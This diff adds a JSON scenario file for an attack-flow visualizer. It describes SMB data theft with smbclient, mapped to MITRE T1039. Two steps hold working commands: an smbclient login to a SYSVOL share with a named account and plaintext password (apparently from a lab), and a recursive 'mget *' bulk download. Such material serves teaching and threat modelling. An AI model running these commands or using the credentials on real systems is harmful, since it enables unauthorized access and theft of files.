@@ -1,0 +1,123 @@
+{
+  "title": "SMB Data Exfiltration (smbclient)",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Environment",
+      "icon": "IconKali",
+      "type": "container",
+      "members": [
+        "smbclient_tool",
+        "stolen_data"
+      ],
+      "position": {
+        "x": 227.267670329077,
+        "y": -7.83800196966402
+      }
+    },
+    {
+      "id": "smbclient_tool",
+      "label": "smbclient",
+      "icon": "IconTerminal",
+      "type": "node",
+      "position": {
+        "x": 264.1434400435869,
+        "y": -131.30829967484664
+      }
+    },
+    {
+      "id": "stolen_data",
+      "label": "Exfiltrated Corporate Files",
+      "icon": "IconData",
+      "type": "node",
+      "position": {
+        "x": 215.28453783899283,
+        "y": -15.268406938935733
+      }
+    },
+    {
+      "id": "corporate_network",
+      "label": "Corporate Network",
+      "icon": "IconNetwork",
+      "type": "container",
+      "members": [
+        "file_server"
+      ],
+      "position": {
+        "x": -172.53299840997295,
+        "y": -57.078614347731545
+      }
+    },
+    {
+      "id": "file_server",
+      "label": "Corporate File Server / NAS",
+      "icon": "IconFolder",
+      "type": "node",
+      "position": {
+        "x": -172.53299840997295,
+        "y": -75.57861434773154
+      }
+    }
+  ],
+  "visibility": {
+    "stolen_data": {
+      "start": 4,
+      "end": 100
+    }
+  },
+  "steps": [
+    {
+      "id": 1,
+      "name": "Start smbclient Session",
+      "type": "edge",
+      "from": "attacker_machine",
+      "to": "smbclient_tool",
+      "description": "The attacker launches smbclient and authenticates to a remote share using compromised credentials.",
+      "cli": "smbclient \\\\attacktivedirectory\\SYSVOL -U spookysec.local/svc-admin management2005"
+    },
+    {
+      "id": 2,
+      "name": "Reach Remote Share Path",
+      "type": "edge",
+      "from": "smbclient_tool",
+      "to": "corporate_network",
+      "description": "The SMB client reaches the target share path inside the corporate network."
+    },
+    {
+      "id": 3,
+      "name": "Authenticate and Traverse Share",
+      "type": "edge",
+      "from": "corporate_network",
+      "to": "file_server",
+      "description": "The remote file server accepts the authenticated session and exposes the selected share contents for browsing."
+    },
+    {
+      "id": 4,
+      "name": "Bulk Download Share Contents",
+      "mitre": {
+        "id": "T1039",
+        "tactic": "Collection",
+        "technique": "Data from Network Shared Drive"
+      },
+      "type": "edge",
+      "from": "file_server",
+      "to": "stolen_data",
+      "description": "Files are recursively downloaded from the share for offline review or exfiltration.",
+      "cli": "prompt off\nrecurse on\nmget *"
+    }
+  ],
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false,
+  "viewport": {
+    "zoom": 1.31,
+    "pan": {
+      "x": 583.5,
+      "y": 354.5
+    }
+  },
+  "stepInfoPosition": {
+    "x": 767.1157531738281,
+    "y": 742.6314086914062
+  }
+}
